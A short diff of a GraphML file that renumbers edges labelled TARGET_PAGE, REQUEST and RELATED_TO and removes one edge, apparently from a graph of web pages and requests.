-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:66" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:48">
+    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:49" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:31">
       <data key="d24">TARGET_PAGE</data>
     </edge>
-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:63" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:64">
+    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:46" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:47">
       <data key="d24">REQUEST</data>
     </edge>
-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:64" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:26">
+    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:47" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:9">
       <data key="d24">TARGET_PAGE</data>
     </edge>
-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:67" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:48">
+    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:50" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:31">
       <data key="d24">TARGET_PAGE</data>
     </edge>
-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:67" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:0">
+    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:50" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:2">
       <data key="d24">RELATED_TO</data>
-    </edge>
-    <edge source="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:71" target="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:70">
-      <data key="d24">TARGET_PAGE</data>
     </edge>
   </graph>
 </graphml>
